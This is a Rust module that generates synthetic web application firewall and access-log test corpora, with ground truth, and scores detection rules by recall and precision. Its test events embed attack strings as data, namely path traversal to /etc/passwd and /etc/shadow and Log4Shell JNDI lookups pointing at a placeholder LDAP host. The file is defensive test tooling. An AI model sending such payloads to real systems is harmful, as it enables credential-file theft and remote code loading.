//! Reproducible, passive synthetic validation for the scanner.

use std::{
    collections::{BTreeMap, BTreeSet},
    fs::File,
    io::{BufRead, BufReader, BufWriter, Write},
    path::Path,
    time::Instant,
};

use anyhow::{Context, Result};
use flate2::{write::GzEncoder, Compression};
use serde::{Deserialize, Serialize};

use crate::{
    output::Finding,
    sigma::load_rules,
    waf::{maybe_gzip_reader, WafLines},
};

pub const JA4_EXACT: &str = "t13d1516h2_8daaf6152771_02713d6af862";
pub const JA4_SHARED: &str = "t13d1516h2_111111111111_222222222222";
pub const JA4_COMMON: &str = "t13d1516h2_333333333333_444444444444";
pub const VOLUMETRIC_CONCENTRATION_EVENTS: usize = 40_000;
pub const VOLUMETRIC_CONCENTRATION_SOURCE_IPS: usize = 24_000;
pub const VOLUMETRIC_CONCENTRATION_PATH: &str = "/synthetic/volume-target";
pub const VOLUMETRIC_CONCENTRATION_DURATION_MS: i64 = 3_600_000;

#[derive(Debug, Clone, Copy, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Profile {
    Deterministic,
    Mutations,
    Large,
    Demo,
    VolumetricConcentration,
}

/// Telemetry rendering is deliberately downstream of the logical synthetic
/// request. The same request and ground truth can therefore be compared
/// across AWS WAF JSON and standard combined access logs.
#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "kebab-case")]
pub enum SyntheticFormat {
    AwsWaf,
    NginxCombined,
    ApacheCombined,
}

#[derive(Debug, Clone)]
pub struct GeneratorConfig {
    pub profile: Profile,
    pub events: usize,
    pub attack_rate: f64,
    pub hosts: usize,
    pub source_ips: usize,
    pub seed: u64,
    pub start_timestamp_ms: i64,
    pub duration_ms: i64,
}

impl Default for GeneratorConfig {
    fn default() -> Self {
        Self {
            profile: Profile::Deterministic,
            events: 15,
            attack_rate: 0.01,
            hosts: 3,
            source_ips: 32,
            seed: 42,
            start_timestamp_ms: 1_735_689_600_000,
            duration_ms: 3_600_000,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "lowercase")]
pub enum TruthClass {
    Malicious,
    Benign,
    Unknown,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Expected {
    pub class: TruthClass,
    pub cves: Vec<String>,
    pub expected_rule_ids: Vec<String>,
    pub expected_match: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TruthRecord {
    pub event_id: String,
    pub expected: Expected,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct Manifest {
    pub generator_version: String,
    pub profile: Profile,
    pub seed: u64,
    pub events_requested: usize,
    pub valid_events: usize,
    pub expected_parser_errors: usize,
    pub attack_rate: f64,
    pub hosts: usize,
    pub source_ips: usize,
    pub start_timestamp_ms: i64,
    pub duration_ms: i64,
    pub ja4_distribution: BTreeMap<String, String>,
    pub rule_revision: String,
    pub telemetry_format: SyntheticFormat,
}

#[derive(Debug, Serialize)]
pub struct GenerateResult {
    pub manifest: Manifest,
    pub truth_records: usize,
}

#[derive(Debug, Clone)]
struct SyntheticEvent {
    id: String,
    class: TruthClass,
    cves: Vec<String>,
    expected_rule_ids: Vec<String>,
    path: String,
    args: Option<String>,
    method: String,
    host: String,
    headers: Vec<(&'static str, String)>,
    ja3: Option<String>,
    ja4: Option<String>,
    action: String,
    labels: Vec<String>,
    source_ip: String,
    timestamp: i64,
    response_status: Option<u16>,
}

impl SyntheticEvent {
    fn truth(&self) -> TruthRecord {
        TruthRecord {
            event_id: self.id.clone(),
            expected: Expected {
                class: self.class.clone(),
                cves: self.cves.clone(),
                expected_match: !self.expected_rule_ids.is_empty(),
                expected_rule_ids: self.expected_rule_ids.clone(),
            },
        }
    }

    fn write_json(&self, writer: &mut dyn Write) -> Result<()> {
        let headers: Vec<_> = self
            .headers
            .iter()
            .map(|(name, value)| serde_json::json!({"name": name, "value": value}))
            .collect();
        let mut request = serde_json::json!({
            "clientIp": self.source_ip,
            "country": "US",
            "headers": headers,
            "uri": self.path,
            "httpVersion": "HTTP/2.0",
            "httpMethod": self.method,
            "requestId": self.id,
        });
        if let Some(args) = &self.args {
            request["args"] = serde_json::Value::String(args.clone());
        }
        let mut record = serde_json::json!({
            "timestamp": self.timestamp,
            "formatVersion": 1,
            "webaclId": "synthetic-web-acl",
            "terminatingRuleId": if self.action == "BLOCK" { "synthetic-block" } else { "Default_Action" },
            "terminatingRuleType": "REGULAR",
            "action": self.action,
            "httpSourceName": "ALB",
            "httpSourceId": "app/synthetic/0001",
            "nonTerminatingMatchingRules": [{"ruleId": "synthetic-count", "action": "COUNT"}],
            "httpRequest": request,
            "labels": self.labels.iter().map(|name| serde_json::json!({"name": name})).collect::<Vec<_>>(),
        });
        if let Some(ja3) = &self.ja3 {
            record["ja3Fingerprint"] = serde_json::Value::String(ja3.clone());
        }
        if let Some(ja4) = &self.ja4 {
            record["ja4Fingerprint"] = serde_json::Value::String(ja4.clone());
        }
        if let Some(status) = self.response_status {
            record["responseCodeSent"] = serde_json::Value::from(status);
        }
        serde_json::to_writer(&mut *writer, &record)?;
        writer.write_all(b"\n")?;
        Ok(())
    }

    fn write_combined(&self, writer: &mut dyn Write) -> Result<()> {
        let timestamp = chrono::DateTime::from_timestamp_millis(self.timestamp)
            .ok_or_else(|| anyhow::anyhow!("synthetic timestamp is out of range"))?
            .format("%d/%b/%Y:%H:%M:%S +0000");
        let target = self.args.as_ref().map_or_else(
            || self.path.clone(),
            |query| format!("{}?{query}", self.path),
        );
        let header = |name: &str| {
            self.headers
                .iter()
                .find(|(header_name, _)| header_name.eq_ignore_ascii_case(name))
                .map(|(_, value)| value.as_str())
                .unwrap_or("-")
        };
        // Nginx/Apache escape embedded quotes in their configured log values;
        // this deterministic generator uses a conservative equivalent.
        let escape = |value: &str| value.replace('\\', "\\\\").replace('"', "\\\"");
        writeln!(
            writer,
            "{} - - [{}] \"{} {} HTTP/1.1\" {} 0 \"{}\" \"{}\"",
            self.source_ip,
            timestamp,
            self.method,
            escape(&target),
            self.response_status.unwrap_or(200),
            escape(header("Referer")),
            escape(header("User-Agent")),
        )?;
        Ok(())
    }

    fn write(&self, writer: &mut dyn Write, format: SyntheticFormat) -> Result<()> {
        match format {
            SyntheticFormat::AwsWaf => self.write_json(writer),
            SyntheticFormat::NginxCombined | SyntheticFormat::ApacheCombined => {
                self.write_combined(writer)
            }
        }
    }
}

pub fn generate(
    output: &Path,
    truth_path: &Path,
    manifest_path: &Path,
    config: &GeneratorConfig,
) -> Result<GenerateResult> {
    generate_for_format(
        output,
        truth_path,
        manifest_path,
        config,
        SyntheticFormat::AwsWaf,
    )
}

pub fn generate_for_format(
    output: &Path,
    truth_path: &Path,
    manifest_path: &Path,
    config: &GeneratorConfig,
    format: SyntheticFormat,
) -> Result<GenerateResult> {
    if !(0.0..=1.0).contains(&config.attack_rate) {
        anyhow::bail!("attack rate must be between 0 and 1");
    }
    if config.hosts == 0 || config.source_ips == 0 {
        anyhow::bail!("hosts and source IPs must be positive");
    }
    if matches!(config.profile, Profile::VolumetricConcentration)
        && config.events != VOLUMETRIC_CONCENTRATION_EVENTS
    {
        anyhow::bail!(
            "volumetric-concentration requires exactly {VOLUMETRIC_CONCENTRATION_EVENTS} events to preserve its documented shape"
        );
    }
    if matches!(config.profile, Profile::VolumetricConcentration)
        && config.duration_ms != VOLUMETRIC_CONCENTRATION_DURATION_MS
    {
        anyhow::bail!(
            "volumetric-concentration requires duration-ms={VOLUMETRIC_CONCENTRATION_DURATION_MS} to preserve its documented minute-rate shape"
        );
    }
    let (events, malformed) = match config.profile {
        Profile::Deterministic => (deterministic_events(config), true),
        Profile::Mutations => (mutation_events(config), true),
        Profile::Large => (large_events(config), false),
        Profile::Demo => (demo_events(config), false),
        Profile::VolumetricConcentration => (volumetric_concentration_events(config), false),
    };
    let mut output = output_writer(output)?;
    let mut truth_writer = BufWriter::new(
        File::create(truth_path).with_context(|| format!("creating {}", truth_path.display()))?,
    );
    for event in &events {
        event.write(&mut output, format)?;
        serde_json::to_writer(&mut truth_writer, &event.truth())?;
        truth_writer.write_all(b"\n")?;
    }
    if malformed {
        match format {
            SyntheticFormat::AwsWaf => output.write_all(b"{\"timestamp\":broken}\n")?,
            SyntheticFormat::NginxCombined | SyntheticFormat::ApacheCombined => {
                output.write_all(b"malformed combined line\n")?
            }
        }
    }
    output.finish()?;
    truth_writer.flush()?;
    let manifest = Manifest {
        generator_version: env!("CARGO_PKG_VERSION").to_owned(),
        profile: config.profile,
        seed: config.seed,
        events_requested: if matches!(config.profile, Profile::VolumetricConcentration) {
            events.len()
        } else {
            config.events
        },
        valid_events: events.len(),
        expected_parser_errors: usize::from(malformed),
        attack_rate: if matches!(config.profile, Profile::VolumetricConcentration) {
            0.0
        } else {
            config.attack_rate
        },
        hosts: config.hosts,
        source_ips: if matches!(config.profile, Profile::VolumetricConcentration) {
            VOLUMETRIC_CONCENTRATION_SOURCE_IPS
        } else {
            config.source_ips
        },
        start_timestamp_ms: config.start_timestamp_ms,
        duration_ms: config.duration_ms,
        ja4_distribution: BTreeMap::from([
            ("malicious_only".to_owned(), JA4_EXACT.to_owned()),
            ("shared".to_owned(), JA4_SHARED.to_owned()),
            ("common".to_owned(), JA4_COMMON.to_owned()),
        ]),
        rule_revision: "project-native-tests".to_owned(),
        telemetry_format: format,
    };
    serde_json::to_writer_pretty(
        File::create(manifest_path)
            .with_context(|| format!("creating {}", manifest_path.display()))?,
        &manifest,
    )?;
    Ok(GenerateResult {
        manifest,
        truth_records: events.len(),
    })
}

enum OutputWriter {
    Plain(BufWriter<File>),
    Gzip(GzEncoder<BufWriter<File>>),
}
impl Write for OutputWriter {
    fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
        match self {
            Self::Plain(writer) => writer.write(buf),
            Self::Gzip(writer) => writer.write(buf),
        }
    }
    fn flush(&mut self) -> std::io::Result<()> {
        match self {
            Self::Plain(writer) => writer.flush(),
            Self::Gzip(writer) => writer.flush(),
        }
    }
}
impl OutputWriter {
    fn finish(self) -> Result<()> {
        match self {
            Self::Plain(mut writer) => writer.flush()?,
            Self::Gzip(writer) => {
                writer.finish()?.flush()?;
            }
        }
        Ok(())
    }
}
fn output_writer(path: &Path) -> Result<OutputWriter> {
    let writer =
        BufWriter::new(File::create(path).with_context(|| format!("creating {}", path.display()))?);
    Ok(
        if path
            .extension()
            .and_then(|value| value.to_str())
            .is_some_and(|value| value.eq_ignore_ascii_case("gz"))
        {
            OutputWriter::Gzip(GzEncoder::new(writer, Compression::default()))
        } else {
            OutputWriter::Plain(writer)
        },
    )
}

fn event(
    config: &GeneratorConfig,
    id: usize,
    class: TruthClass,
    expected_rule_ids: &[&str],
    path: &str,
    args: Option<&str>,
) -> SyntheticEvent {
    SyntheticEvent {
        id: format!("evt-{id:06}"),
        class,
        cves: Vec::new(),
        expected_rule_ids: expected_rule_ids
            .iter()
            .map(|value| (*value).to_owned())
            .collect(),
        path: path.to_owned(),
        args: args.map(str::to_owned),
        method: "GET".to_owned(),
        host: "api.synthetic.test".to_owned(),
        headers: vec![
            ("Host", "api.synthetic.test".to_owned()),
            ("User-Agent", "Mozilla/5.0 synthetic".to_owned()),
        ],
        ja3: Some("0123456789abcdef0123456789abcdef".to_owned()),
        ja4: None,
        action: "ALLOW".to_owned(),
        labels: Vec::new(),
        source_ip: format!("198.51.100.{}", id % 200 + 1),
        timestamp: config.start_timestamp_ms + (id as i64 * 1_000),
        response_status: None,
    }
}

fn deterministic_events(config: &GeneratorConfig) -> Vec<SyntheticEvent> {
    let mut events = Vec::new();
    add(&mut events, config, TruthClass::Benign, &[], "/", None); // browser
    add(
        &mut events,
        config,
        TruthClass::Benign,
        &[],
        "/api/users/me",
        Some("expand=profile"),
    ); // API
    add(
        &mut events,
        config,
        TruthClass::Malicious,
        &["test-path-traversal"],
        "/download",
        Some("file=../../etc/passwd"),
    );
    add(
        &mut events,
        config,
        TruthClass::Malicious,
        &["cve-2021-44228-request-side"],
        "/lookup",
        Some("q=${jndi:ldap://validation.invalid/a}"),
    );
    add(
        &mut events,
        config,
        TruthClass::Malicious,
        &["known-suspicious-ja4"],
        "/scan",
        None,
    )
    .ja4 = Some(JA4_EXACT.to_owned());
    add(
        &mut events,
        config,
        TruthClass::Malicious,
        &["test-ja4-uri"],
        "/vulnerable/admin",
        None,
    )
    .ja4 = Some(JA4_SHARED.to_owned());
    add(
        &mut events,
        config,
        TruthClass::Benign,
        &[],
        "/assets/app.js",
        None,
    )
    .ja4 = Some(JA4_SHARED.to_owned());
    add(
        &mut events,
        config,
        TruthClass::Benign,
        &[],
        "/vulnerable/admin",
        None,
    )
    .ja4 = Some(JA4_COMMON.to_owned());
    add(
        &mut events,
        config,
        TruthClass::Benign,
        &[],
        "/vulnerable/admin-docs",
        None,
    )
    .ja4 = Some(JA4_SHARED.to_owned());
    add(
        &mut events,
        config,
        TruthClass::Malicious,
        &["test-path-traversal"],
        "/download",
        Some("file=../../etc/shadow"),
    )
    .action = "BLOCK".to_owned();
    add(
        &mut events,
        config,
        TruthClass::Malicious,
        &["cve-2021-44228-request-side"],
        "/lookup",
        Some("q=${jndi:ldap://validation.invalid/b}"),
    );
    add(
        &mut events,
        config,
        TruthClass::Malicious,
        &["test-waf-label"],
        "/telemetry",
        None,
    )
    .labels = vec![
        "project:synthetic-malicious".to_owned(),
        "awswaf:managed:aws:core-rule-set:GenericRFI_QUERYARGUMENTS".to_owned(),
    ];
    add(
        &mut events,
        config,
        TruthClass::Benign,
        &[],
        "/favicon.ico",
        None,
    ); // missing JA4
    add(
        &mut events,
        config,
        TruthClass::Benign,
        &[],
        "/vulnerable-docs",
        None,
    ); // near miss
    add(
        &mut events,
        config,
        TruthClass::Benign,
        &[],
        "/api/search",
        Some("q=shoes"),
    )
    .method = "POST".to_owned();
    events
}

/// A safe, deterministic production-hunt demonstration. These are synthetic
/// CVE-style request patterns matched by the project-owned demo templates;
/// they contain no real targets, credentials, people, or public IPs.
fn demo_events(config: &GeneratorConfig) -> Vec<SyntheticEvent> {
    let mut events = Vec::new();
    add(&mut events, config, TruthClass::Benign, &[], "/", None); // browser
    add(
        &mut events,
        config,
        TruthClass::Benign,
        &[],
        "/api/items",
        Some("limit=10"),
    ); // API
    let traversal = add(
        &mut events,
        config,
        TruthClass::Malicious,
        &[],
        "/download",
        Some("file=../../etc/passwd"),
    );
    traversal.ja4 = Some(JA4_SHARED.to_owned());
    let lookup = add(
        &mut events,
        config,
        TruthClass::Malicious,
        &[],
        "/lookup",
        Some("q=${jndi:ldap://validation.invalid/demo}"),
    );
    lookup.ja4 = Some(JA4_EXACT.to_owned());
    add(
        &mut events,
        config,
        TruthClass::Malicious,
        &[],
        "/vulnerable/admin",
        None,
    );
    let header_only = add(
        &mut events,
        config,
        TruthClass::Malicious,
        &[],
        "/vulnerable/execute",
        Some("cmd=probe"),
    );
    header_only
        .headers
        .push(("X-Demo-Exploit", "marker-2099".to_owned()));
    // Near misses deliberately preserve related-looking paths/parameters but
    // must not match the exact demo Nuclei detection IR.
    add(
        &mut events,
        config,
        TruthClass::Benign,
        &[],
        "/download-docs",
        Some("file=manual.pdf"),
    );
    add(
        &mut events,
        config,
        TruthClass::Benign,
        &[],
        "/lookup",
        Some("q=hello"),
    );
    add(
        &mut events,
        config,
        TruthClass::Benign,
        &[],
        "/vulnerable/admin-docs",
        None,
    );
    add(
        &mut events,
        config,
        TruthClass::Benign,
        &[],
        "/vulnerable/execute",
        Some("cmd=probe"),
    );
    let blocked = add(
        &mut events,
        config,
        TruthClass::Malicious,
        &[],
        "/download",
        Some("file=../../etc/passwd"),
    );
    blocked.action = "BLOCK".to_owned();
    blocked.ja4 = Some(JA4_SHARED.to_owned());
    for event in &mut events {
        event.host = "api.demo.example.com".to_owned();
        event
            .headers
            .retain(|(name, _)| !name.eq_ignore_ascii_case("Host"));
        event
            .headers
            .insert(0, ("Host", "api.demo.example.com".to_owned()));
    }
    events
}

fn mutation_events(config: &GeneratorConfig) -> Vec<SyntheticEvent> {
    let mut events = Vec::new();
    add(
        &mut events,
        config,
        TruthClass::Malicious,
        &["cve-2021-44228-request-side"],
        "/lookup",
        Some("x=1&q=${jndi:ldap://validation.invalid/m1}"),
    )
    .headers
    .reverse();
    add(
        &mut events,
        config,
        TruthClass::Malicious,
        &["test-path-traversal"],
        "/download",
        Some("x=1&file=../../etc/passwd"),
    );
    let compound = add(
        &mut events,
        config,
        TruthClass::Malicious,
        &["test-ja4-uri"],
        "/vulnerable/admin",
        Some("source=mutation"),
    );
    compound.ja4 = Some(JA4_SHARED.to_owned());
    compound.headers = vec![("Host", "alt.synthetic.test".to_owned())];
    add(
        &mut events,
        config,
        TruthClass::Benign,
        &[],
        "/download-docs",
        Some("file=manual.pdf"),
    );
    add(
        &mut events,
        config,
        TruthClass::Benign,
        &[],
        "/lookup",
        Some("q=hello"),
    );
    add(
        &mut events,
        config,
        TruthClass::Benign,
        &[],
        "/vulnerable/admin-docs",
        None,
    )
    .ja4 = Some(JA4_SHARED.to_owned());
    events
}

fn add<'a>(
    events: &'a mut Vec<SyntheticEvent>,
    config: &GeneratorConfig,
    class: TruthClass,
    rules: &[&str],
    path: &str,
    args: Option<&str>,
) -> &'a mut SyntheticEvent {
    let id = events.len() + 1;
    events.push(event(config, id, class, rules, path, args));
    events.last_mut().expect("just pushed")
}

fn large_events(config: &GeneratorConfig) -> Vec<SyntheticEvent> {
    let mut random = Lcg::new(config.seed);
    (0..config.events)
        .map(|index| {
            let attack = random.unit() < config.attack_rate;
            let id = index + 1;
            let mut event = if attack {
                match random.next() % 3 {
                    0 => event(
                        config,
                        id,
                        TruthClass::Malicious,
                        &["test-path-traversal"],
                        "/download",
                        Some("file=../../etc/passwd"),
                    ),
                    1 => event(
                        config,
                        id,
                        TruthClass::Malicious,
                        &["cve-2021-44228-request-side"],
                        "/lookup",
                        Some("q=${jndi:ldap://validation.invalid/large}"),
                    ),
                    _ => {
                        let mut item = event(
                            config,
                            id,
                            TruthClass::Malicious,
                            &["test-ja4-uri"],
                            "/vulnerable/admin",
                            None,
                        );
                        item.ja4 = Some(JA4_SHARED.to_owned());
                        item
                    }
                }
            } else {
                let paths = [
                    "/",
                    "/favicon.ico",
                    "/assets/app.js",
                    "/assets/style.css",
                    "/api/users/me",
                    "/api/products/123",
                    "/health",
                    "/robots.txt",
                ];
                let mut item = event(
                    config,
                    id,
                    TruthClass::Benign,
                    &[],
                    paths[(random.next() as usize) % paths.len()],
                    None,
                );
                item.method = if random.next().is_multiple_of(10) {
                    "POST".to_owned()
                } else {
                    "GET".to_owned()
                };
                if random.next().is_multiple_of(3) {
                    item.args = Some("page=1&sort=recent".to_owned());
                }
                if random.next().is_multiple_of(4) {
                    item.ja4 = Some(JA4_SHARED.to_owned());
                } else if random.next().is_multiple_of(3) {
                    item.ja4 = Some(JA4_COMMON.to_owned());
                }
                item
            };
            event.host = format!(
                "app{}.synthetic.test",
                random.next() as usize % config.hosts + 1
            );
            event.source_ip = format!(
                "203.0.113.{}",
                random.next() as usize % config.source_ips + 1
            );
            event.timestamp =
                config.start_timestamp_ms + (random.next() as i64 % config.duration_ms.max(1));
            event
        })
        .collect()
}

/// Reproduce a documented request-volume distribution without representing a
/// real incident, operator, campaign, or vulnerability. Every record is
/// ground-truth `unknown`; the profile exists only to exercise concentration
/// measurements with many individually modest observed peers.
fn volumetric_concentration_events(config: &GeneratorConfig) -> Vec<SyntheticEvent> {
    const FOCUS_REQUESTS: usize = 12_000;
    const FOCUS_SOURCES: usize = 350;
    const BACKGROUND_SOURCES: usize = VOLUMETRIC_CONCENTRATION_SOURCE_IPS - FOCUS_SOURCES;

    let focus_sources = volumetric_focus_sources();
    debug_assert_eq!(focus_sources.len(), FOCUS_SOURCES);
    let mut events = Vec::with_capacity(VOLUMETRIC_CONCENTRATION_EVENTS);
    let mut focus_record = 0;
    for (source_index, source_ip) in focus_sources.iter().enumerate() {
        let requests = match source_index {
            0..10 => 400,
            10..20 => 36,
            20..84 => 35,
            84..164 => 21,
            _ => 20,
        };
        for _ in 0..requests {
            let id = events.len() + 1;
            let mut item = event(
                config,
                id,
                TruthClass::Unknown,
                &[],
                VOLUMETRIC_CONCENTRATION_PATH,
                None,
            );
            item.source_ip.clone_from(source_ip);
            item.response_status = Some(if focus_record % 100 == 0 { 200 } else { 404 });
            configure_volumetric_event(&mut item, config, id);
            events.push(item);
            focus_record += 1;
        }
    }
    debug_assert_eq!(events.len(), FOCUS_REQUESTS);

    let seed_offset = config.seed as usize % BACKGROUND_SOURCES;
    while events.len() < VOLUMETRIC_CONCENTRATION_EVENTS {
        let background_index = events.len() - FOCUS_REQUESTS;
        let source_index = (background_index + seed_offset) % BACKGROUND_SOURCES;
        let source_ip = benchmark_source_ip(100, source_index);
        let path_index = (background_index + config.seed as usize) % 32;
        let path = format!("/synthetic/background/{path_index:02}");
        let id = events.len() + 1;
        let mut item = event(config, id, TruthClass::Unknown, &[], &path, None);
        item.source_ip = source_ip;
        item.response_status = Some(200);
        configure_volumetric_event(&mut item, config, id);
        events.push(item);
    }
    events
}

fn volumetric_focus_sources() -> Vec<String> {
    let mut sources = Vec::with_capacity(350);
    let mut selected = BTreeSet::new();

    // Spread the ten busiest peers across all seven leading /24 blocks. This
    // keeps per-peer volume modest while those seven address blocks account
    // for 55% of the focus-path request volume.
    for third_octet in 0..7 {
        push_focus_source(&mut sources, &mut selected, third_octet, 1);
    }
    for third_octet in 0..3 {
        push_focus_source(&mut sources, &mut selected, third_octet, 2);
    }
    for third_octet in 0..7 {
        for last_octet in 1..=12 {
            push_focus_source(&mut sources, &mut selected, third_octet, last_octet);
        }
    }
    for third_octet in 7..20 {
        for last_octet in 1..=12 {
            push_focus_source(&mut sources, &mut selected, third_octet, last_octet);
        }
    }
    for third_octet in 20..30 {
        for last_octet in 1..=11 {
            push_focus_source(&mut sources, &mut selected, third_octet, last_octet);
        }
    }
    sources
}

fn push_focus_source(
    sources: &mut Vec<String>,
    selected: &mut BTreeSet<String>,
    third_octet: usize,
    last_octet: usize,
) {
    let source = format!("198.18.{third_octet}.{last_octet}");
    if selected.insert(source.clone()) {
        sources.push(source);
    }
}

fn benchmark_source_ip(first_third_octet: usize, index: usize) -> String {
    let third_octet = first_third_octet + index / 254;
    let last_octet = index % 254 + 1;
    format!("198.18.{third_octet}.{last_octet}")
}

fn configure_volumetric_event(event: &mut SyntheticEvent, config: &GeneratorConfig, id: usize) {
    const MINUTES: usize = 60;
    const BURST_MINUTE: usize = 30;
    const BURST_RECORDS: usize = 5_000;

    let zero_based = id - 1;
    let minute = if zero_based < BURST_RECORDS {
        BURST_MINUTE
    } else {
        let non_burst = (zero_based - BURST_RECORDS) % (MINUTES - 1);
        if non_burst >= BURST_MINUTE {
            non_burst + 1
        } else {
            non_burst
        }
    };
    event.timestamp = config.start_timestamp_ms
        + minute as i64 * 60_000
        + ((zero_based + config.seed as usize) % 60) as i64 * 1_000;
    event.host = format!("volume{}.synthetic.test", zero_based % config.hosts + 1);
    event.headers = vec![
        ("Host", event.host.clone()),
        ("User-Agent", "Shenron-Synthetic-Volume/1.0".to_owned()),
    ];
    event.ja3 = None;
    event.ja4 = None;
    event.action = "ALLOW".to_owned();
}

struct Lcg {
    state: u64,
}
impl Lcg {
    fn new(seed: u64) -> Self {
        Self { state: seed }
    }
    fn next(&mut self) -> u64 {
        self.state = self
            .state
            .wrapping_mul(6_364_136_223_846_793_005)
            .wrapping_add(1);
        self.state
    }
    fn unit(&mut self) -> f64 {
        (self.next() >> 11) as f64 / (1_u64 << 53) as f64
    }
}

#[derive(Debug, Serialize)]
pub struct Failure {
    pub case_id: String,
    pub status: String,
    pub category: String,
    pub expected_rule: Option<String>,
    pub details: String,
}

#[derive(Debug, Default, Serialize)]
pub struct Metrics {
    pub events: usize,
    pub expected_malicious: usize,
    pub expected_benign: usize,
    pub expected_detections: usize,
    pub detected_expected: usize,
    pub missed: usize,
    pub unexpected_matches: usize,
    pub parser_errors: usize,
    pub true_positives: usize,
    pub false_negatives: usize,
    pub false_positives: usize,
    pub true_negatives: usize,
}

#[derive(Debug, Serialize)]
pub struct ValidationReport {
    pub status: String,
    pub metrics: Metrics,
    pub recall: Option<f64>,
    pub precision: Option<f64>,
    pub false_positive_rate: Option<f64>,
    pub failures: Vec<Failure>,
}

pub fn validate_corpus(
    corpus: &Path,
    truth_path: &Path,
    rules_path: &Path,
    manifest_path: Option<&Path>,
) -> Result<ValidationReport> {
    let truth = read_truth(truth_path)?;
    let rules = load_rules(rules_path);
    let compressed = corpus
        .extension()
        .and_then(|value| value.to_str())
        .is_some_and(|value| value.eq_ignore_ascii_case("gz"));
    let reader = maybe_gzip_reader(
        File::open(corpus).with_context(|| format!("opening {}", corpus.display()))?,
        compressed,
    );
    let mut actual: BTreeMap<String, BTreeSet<String>> = BTreeMap::new();
    let mut parser_errors = 0;
    for result in WafLines::new(reader) {
        match result {
            Ok(event) => {
                let id = event.request_id.clone().unwrap_or_default();
                let matcher = crate::sigma::EventMatcher::new(&event);
                for rule in &rules.supported {
                    if matcher.matches(rule) {
                        actual
                            .entry(id.clone())
                            .or_default()
                            .insert(rule.id.clone());
                    }
                }
            }
            Err(_) => parser_errors += 1,
        }
    }
    let expected_parser_errors = manifest_path
        .map(read_manifest)
        .transpose()?
        .map_or(0, |manifest| manifest.expected_parser_errors);
    let mut metrics = Metrics {
        events: truth.len(),
        parser_errors,
        ..Metrics::default()
    };
    let mut failures = Vec::new();
    if parser_errors != expected_parser_errors {
        failures.push(Failure {
            case_id: "parser".to_owned(),
            status: "failed".to_owned(),
            category: "PARSER_ERROR".to_owned(),
            expected_rule: None,
            details: format!(
                "expected {expected_parser_errors} parser errors, observed {parser_errors}"
            ),
        });
    }
    for (id, record) in &truth {
        let actual_rules = actual.get(id).cloned().unwrap_or_default();
        let expected_rules: BTreeSet<_> =
            record.expected.expected_rule_ids.iter().cloned().collect();
        match record.expected.class {
            TruthClass::Malicious => metrics.expected_malicious += 1,
            TruthClass::Benign => metrics.expected_benign += 1,
            TruthClass::Unknown => {}
        }
        metrics.expected_detections += expected_rules.len();
        for rule in expected_rules.difference(&actual_rules) {
            metrics.missed += 1;
            failures.push(Failure {
                case_id: id.clone(),
                status: "failed".to_owned(),
                category: "EXPECTED_RULE_MISSED".to_owned(),
                expected_rule: Some(rule.clone()),
                details: "the expected rule did not produce a finding".to_owned(),
            });
        }
        metrics.detected_expected += expected_rules.intersection(&actual_rules).count();
        for rule in actual_rules.difference(&expected_rules) {
            metrics.unexpected_matches += 1;
            failures.push(Failure {
                case_id: id.clone(),
                status: "failed".to_owned(),
                category: "EXPECTED_BEHAVIOR_ERROR".to_owned(),
                expected_rule: None,
                details: format!("unexpected finding from rule `{rule}`"),
            });
        }
        match record.expected.class {
            TruthClass::Malicious
                if !expected_rules.is_empty() && expected_rules.is_subset(&actual_rules) =>
            {
                metrics.true_positives += 1
            }
            TruthClass::Malicious if !expected_rules.is_empty() => metrics.false_negatives += 1,
            TruthClass::Benign if actual_rules.is_empty() => metrics.true_negatives += 1,
            TruthClass::Benign => metrics.false_positives += 1,
            _ => {}
        }
    }
    let recall = ratio(
        metrics.true_positives,
        metrics.true_positives + metrics.false_negatives,
    );
    let precision = ratio(
        metrics.true_positives,
        metrics.true_positives + metrics.false_positives,
    );
    let false_positive_rate = ratio(
        metrics.false_positives,
        metrics.false_positives + metrics.true_negatives,
    );
    Ok(ValidationReport {
        status: if failures.is_empty() {
            "PASS".to_owned()
        } else {
            "FAIL".to_owned()
        },
        metrics,
        recall,
        precision,
        false_positive_rate,
        failures,
    })
}

pub fn validate_findings(findings: &Path, truth_path: &Path) -> Result<ValidationReport> {
    let truth = read_truth(truth_path)?;
    let file = File::open(findings).with_context(|| format!("opening {}", findings.display()))?;
    let mut actual: BTreeMap<String, BTreeSet<String>> = BTreeMap::new();
    for line in BufReader::new(file).lines() {
        let finding: Finding = serde_json::from_str(&line?)?;
        if let Some(id) = finding.request_id {
            actual.entry(id).or_default().insert(finding.rule_id);
        }
    }
    validate_actual(truth, actual, 0, 0)
}

fn validate_actual(
    truth: BTreeMap<String, TruthRecord>,
    actual: BTreeMap<String, BTreeSet<String>>,
    parser_errors: usize,
    expected_parser_errors: usize,
) -> Result<ValidationReport> {
    let mut metrics = Metrics {
        events: truth.len(),
        parser_errors,
        ..Metrics::default()
    };
    let mut failures = Vec::new();
    if parser_errors != expected_parser_errors {
        failures.push(Failure {
            case_id: "parser".to_owned(),
            status: "failed".to_owned(),
            category: "PARSER_ERROR".to_owned(),
            expected_rule: None,
            details: format!(
                "expected {expected_parser_errors} parser errors, observed {parser_errors}"
            ),
        });
    }
    for (id, record) in &truth {
        let actual_rules = actual.get(id).cloned().unwrap_or_default();
        let expected_rules: BTreeSet<_> =
            record.expected.expected_rule_ids.iter().cloned().collect();
        match record.expected.class {
            TruthClass::Malicious => metrics.expected_malicious += 1,
            TruthClass::Benign => metrics.expected_benign += 1,
            TruthClass::Unknown => {}
        }
        metrics.expected_detections += expected_rules.len();
        for rule in expected_rules.difference(&actual_rules) {
            metrics.missed += 1;
            failures.push(Failure {
                case_id: id.clone(),
                status: "failed".to_owned(),
                category: "EXPECTED_RULE_MISSED".to_owned(),
                expected_rule: Some(rule.clone()),
                details: "the expected rule did not produce a finding".to_owned(),
            });
        }
        metrics.detected_expected += expected_rules.intersection(&actual_rules).count();
        for rule in actual_rules.difference(&expected_rules) {
            metrics.unexpected_matches += 1;
            failures.push(Failure {
                case_id: id.clone(),
                status: "failed".to_owned(),
                category: "EXPECTED_BEHAVIOR_ERROR".to_owned(),
                expected_rule: None,
                details: format!("unexpected finding from rule `{rule}`"),
            });
        }
